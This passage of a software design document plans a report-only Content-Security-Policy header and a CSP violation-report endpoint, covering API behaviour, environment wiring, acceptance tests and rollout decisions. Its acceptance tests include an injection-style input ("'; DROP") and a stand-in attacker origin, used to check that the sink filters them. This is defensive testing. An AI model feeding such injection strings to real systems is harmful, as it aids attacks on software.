**That `style-src 'self'` without `'unsafe-inline'` holds for React 19 + Tailwind v4 + Swagger UI.** The
reasoning in §4.3 is sound and is still reasoning: if it is wrong, the reports will be dominated by
style violations and the inventory will be noisy. Nothing breaks — that is what report-only buys — but
the enforcement ticket's first task becomes triage rather than decision. It is flagged here so that a
large style count is read as *the measurement working*, not as an emergency.

### 8.6 Two things that look like failures and are not

- **A report with `blocked-uri: "inline"` and no source.** Browsers deliberately redact cross-origin
  details. Expected; not a bug in the sink.
- **Reports from an extension or an injected script.** Some browser extensions inject into the page and
  produce violations the product cannot fix. They will appear in the inventory and their group's
  decision is *accept and document* — which is why E4 demands a decision per group rather than an empty
  residue.

### 8.7 Idempotency and races

None to manage: the sink is stateless, order-independent, and duplicate reports are expected (the same
violation fires per document load). No deduplication is attempted — a count is exactly what §7 wants.

---

## 9. Data model impact

**None. No migration, no table, no column.** This is a decision:

- reports are not persisted anywhere in Postgres. An unauthenticated door that writes rows is a
  disk-fill vector on an instance whose disk also holds attachments and the database;
- the questions in §7 are aggregate questions, and Loki's existing retention already answers them over
  a window several times longer than E2's 14 days;
- when the enforcement ticket is done, the value of the historical reports is zero, and a table nobody
  reads is a table somebody has to migrate later.

The only durable artefacts are log lines and two counters.

---

## 10. API surface

One endpoint.

**`POST /api/security/csp-report`** — unauthenticated, not workspace-scoped.

| | |
|---|---|
| Request | `application/csp-report` or `application/json`; body is the browser's report — either `{"csp-report": { … }}` or, tolerated, a bare report object / an array of them |
| Success | `204 No Content`, empty body, **always**, including for a report that was filtered or dropped |
| `405` | any method other than `POST` |
| `415` | any other content type |
| `413` | body over 16 KB |
| `429` | over the per-IP or instance budget; carries `Retry-After` |
| `404` | when the sink is disabled — the route is not registered at all, so a DC box exposes nothing |

**`openapi.yaml` + `docs/api-cloud.md` + `docs/api-dc.md` must be updated** (`api-docs-sync`), and the
DC document must state that the endpoint is absent unless enabled. It is documented despite being
browser-only because an operator reading access logs will see the POSTs and needs to find out what they
are — an undocumented unauthenticated endpoint is an incident waiting to be filed against itself.

No other endpoint changes. No response body anywhere gains a field.

---

## 11. Frontend impact

**None in this ticket.** No component, page, store or stylesheet changes; the SPA is not rebuilt for
this feature. `DESIGN.md` is not touched.

Two follow-ups the artefact review uncovered, both separate tickets:

1. **`SwaggerUIBundle({ …, validatorUrl: null })`** — removes a third-party beacon from the docs page,
   which today tells `validator.swagger.io` the hostname of every install whose users open it, and
   renders a broken image on an air-gapped one. **This must ship *after* the canary has been observed**
   (§4.4); shipping it first destroys the only pre-identified proof that the collection pipeline works.
2. **Self-hosting the three font families.** It would remove two external origins from the policy
   (`style-src` and `font-src` collapse to `'self'`), stop every page load from contacting Google, and
   make the product work offline. It is a `DESIGN.md`-adjacent change with a bundle-size trade-off, and
   it is not this ticket's to make.

---

## 12. DC / Cloud, and the env wiring

Two properties, both `@ConfigurationProperties` under `common.config`, both `@Validated`.

| Property | Env var | `dc` | `cloud` | Meaning |
|---|---|---|---|---|
| `app.csp.report-only-enabled` | `CSP_REPORT_ONLY_ENABLED` | `true` | `true` | emit the header at all |
| `app.csp.sink-enabled` | `CSP_REPORT_SINK_ENABLED` | **`false`** | **`true`** | register the endpoint, and emit the `report-uri` clause |
| `app.csp.policy` | `CSP_POLICY` | *(empty)* | *(empty)* | full override of the directive string; empty means the built-in of §4.1 |
| `app.csp.reports-per-minute-per-ip` | `CSP_REPORTS_PER_MINUTE_PER_IP` | `60` | `60` | per-IP budget (§6.2) |
| `app.csp.reports-per-minute` | `CSP_REPORTS_PER_MINUTE` | `600` | `600` | instance budget |

**The only profile-gated value is `sink-enabled`**, and it follows the shape `app.storage.type` and
`app.registration.public-signup-enabled` already use: the default lives in the profile file, the
mechanism is identical in both modes, and there is no branch anywhere in the code that asks which
profile it is running under. The header itself is identical in both modes but for the presence of the
`report-uri` clause, which is a function of `sink-enabled` and not of the profile.

**Nothing here depends on `SITE_ADDRESS`, `APP_BASE_URL` or any deployment address** (§4.1) — except the
foreign-document filter (§6.5), which reads `app.base-url`, a property every install already sets.

**Wiring targets** (`dc-cloud-guard`'s checklist, in order): `application.properties` (all five, with
`${ENV:default}`) → `application-dc.properties` / `application-cloud.properties` (`sink-enabled` only) →
`docker-compose.prod.yml` (the app service's `environment:` block, quoted, `${…:-default}` form) →
`.env.prod.example` (a commented block explaining what the report-only period is *for*, since an
operator who does not know will assume it is broken) → `docs/self-hosting.md` env table (with the
`RATE_LIMIT_TRUST_FORWARDED_FOR` pairing of §6.6) → `docs/observability.md` metric table.

---

## 13. Acceptance criteria, each with the artefact that produces it

**The header**

1. Every response of the main chain carries `Content-Security-Policy-Report-Only` with the §4.1 string.
   — *evidence:* a MockMvc test over a document response (`GET /`), an API `200`, an API `401`, and an
   API `404`.
2. The `report-uri` clause is present exactly when `app.csp.sink-enabled` is true, and absent otherwise.
   — *evidence:* the same test at both property values.
3. `CSP_REPORT_ONLY_ENABLED=false` removes the header entirely and changes nothing else. — *evidence:* a
   test at that value.
4. A policy override containing a control character **fails startup**. — *evidence:* a context-load test
   asserting the binding failure (§8.1).
5. The `:9090` management chain carries no CSP. — *evidence:* the existing actuator test extended by one
   assertion (§5.2).
6. `DatabaseBusyRefusal`'s `503` carries the same header block as the advice's. — *evidence:*
   `DatabaseBusyRefusalTest.theFiltersRefusalCarriesEverySecurityHeaderTheAdvicesDoes` **passes without
   being edited**, which it will only do once `SECURITY_HEADERS` has gained the entry (§5.4).

**The sink**

7. `POST /api/security/csp-report` with a real Chrome report body answers `204` and emits one log line
   and one `hamstrack.csp.violations{directive="img-src"}` increment. — *evidence:* an integration test
   with a captured real report body, not a hand-written one.
8. `GET`/`PUT` → `405`; `text/plain` → `415`; a 17 KB body → `413`; the 61st report in a minute from one
   IP → `429` with `Retry-After`. — *evidence:* four assertions, and the `413` asserted to occur without
   the handler being entered.
9. A report whose `document-uri` is `https://evil.example/x` is dropped, counted as `foreign_document`,
   and still answered `204`. — *evidence:* a test.
10. An `effective-directive` of `"'; DROP"`, of a 4 KB string, and of an unknown-but-plausible directive
    all land on the `other` label and create no new Prometheus series. — *evidence:* a test asserting
    the meter's tag values against the closed set.
11. A `document-uri` carrying `?q=<secret>` is logged **without** the query. — *evidence:* a test
    asserting the log field, not the log line.
12. With `CSP_REPORT_SINK_ENABLED=false` the endpoint is not registered (`404`) **and** the header names
    no `report-uri`. — *evidence:* one test asserting both, together, because either alone is the
    failure mode of §8.2.
13. The sink spends no auth budget: 100 reports followed by a login attempt from the same IP does not
    `429` the login. — *evidence:* a test. (This is the assertion that would have caught the "shared
    budget" mistake, and it is cheap.)

**Wiring and documentation**

14. All five properties resolve from env vars with the documented defaults, and both profile files carry
    only `sink-enabled`. — *evidence:* the diff plus a properties test.
15. `docker-compose.prod.yml`, `.env.prod.example`, `docs/self-hosting.md` and `docs/observability.md`
    each carry their row. — *evidence:* `dc-cloud-guard`.
16. `openapi.yaml` validates and both API documents describe the endpoint including its DC absence. —
    *evidence:* `api-docs-sync` + swagger-cli.

**Production, after deployment**

17. The §4.4 canary appears in the collected reports within 24 h of the header going live in Cloud. —
    *evidence:* the log line and the counter, pasted on the ticket. **If it does not appear, the ticket
    is not done** — the sink, the header or the `report-uri` is broken, and the correct next step is to
    find out which, not to conclude the policy is clean.
18. `hamstrack_csp_violations_total` and `hamstrack_csp_reports_dropped_total` are visible in Prometheus
    on production. — *evidence:* a query screenshot or the raw scrape.
19. The E2/E3 walk is recorded on the ticket with its date, the three engines, and the surface
    checklist. — *evidence:* the ticket comment.

---

## 14. Open questions — owner decisions, with a recommendation each

**D1 — Is the sink on by default in Cloud, or does it get flipped on by hand after the header ships?**
*Recommendation: on by default in Cloud, in the same release as the header.* The two halves are useless
apart — a header with no sink produces console-only evidence on an instance whose console nobody is
watching, and a sink with no header produces nothing at all. The cost is one new unauthenticated
endpoint on the public instance, bounded and persisting nothing. If the owner prefers a staged switch,
the correct order is header first, sink within days, and the canary check moves to the sink's date.

**D2 — Should DC ship the header at all, given that DC has no sink by default?** *Recommendation: yes.*
A report-only header with no `report-uri` still writes violations to the browser console, costs ≈280
bytes, cannot block anything, and means a self-hoster reporting "my board looks odd" has the evidence
already on their screen. The alternative — a header only Cloud gets — is a behavioural fork by profile
for no benefit and would make DC the mode where the enforcement policy has never been observed.

**D3 — `report-to` / `Reporting-Endpoints` now, or in the enforcement ticket?** *Recommendation: the
enforcement ticket.* Chrome ignores `report-uri` when `report-to` is present, so a mis-wired
`Reporting-Endpoints` header silently yields **zero** reports from the majority engine while everything
looks correct — the exact "silence reads as health" failure this whole document is arranged against.
Phase 1 ships the mechanism that cannot fail that way; phase 2 adds the modern one with a working
baseline to compare against. Cost of deferring: `report-uri` is deprecated (not removed) and Chrome's
reports arrive synchronously rather than batched.

**D4 — Does the enforcement ticket exist now, empty, or is it filed at the end of the window?**
*Recommendation: file it now, blocked, with §7 pasted into it as its definition of done.* A ticket that
exists is a ticket somebody notices in fourteen days; a ticket to be filed later is a ticket filed when
somebody remembers. It should also carry the §11 items as its two known inputs.

**D5 — 14 days (E2), or one full release cycle?** *Recommendation: 14 days.* It spans two working weeks,
which is what makes weekly-cadence surfaces appear twice, and it does not couple the enforcement
decision to a release calendar that may move for unrelated reasons. If the owner wants the two aligned,
"the release after the window closes" is the right coupling, not "the window is the cycle".

**D6 — Is the docs page's Swagger validator badge a security ticket or a chore?**
*Recommendation: a chore, filed immediately, scheduled after the canary.* It is a third-party beacon on
a public page rather than a vulnerability — it exposes the instance's hostname, which is already public
for Cloud and is a genuine (small) disclosure for a self-hoster behind a corporate network. Flagged
because it is the sort of item that gets closed early by whoever is nearest, which would cost the
rollout its proof.

---

## 15. Architectural decisions

**One**, and it is the one the ticket itself calls its real decision. The report sink deliberately gets
no ADR: it is one property, one endpoint and no persisted data, so it is reversible in a release and a
future reader asking "why an endpoint?" is answered by §6.1's table.

1. **Security response headers are set by the application, not by the edge.** Chosen over: setting the
   CSP in the `Caddyfile` (rejected — the file is one of the two paths `apply-config.sh` hard-refuses
   to sync, so the policy would be invisible to the repository, absent for every self-hoster who fronts
   the app with something else, and would need a fifth `hamstrack_config_drift` scope to be observable
   at all); setting it in both places (rejected — two sources for one header, and the stricter of the
   two silently wins in a way no test can see); a `<meta http-equiv>` fallback in `index.html`
   (rejected — `frame-ancestors` and `report-uri` are both ignored in a meta-delivered policy, so the
   fallback would be quietly weaker than the thing it duplicates). Trade-off: responses Caddy generates
   itself — its `413`, its `502`/`504`, its redirects — carry no CSP, and this is accepted because none
   of them is a document that can execute script (§5.2 enumerates all four). The rule that decides
   future cases is a category and not a list: *a control the repository can ship inside the image does
   not belong in the one file a deploy is forbidden to sync; `edge-body-limit` is at the edge because
   its control cannot live anywhere else.* → **ADR-0035**.
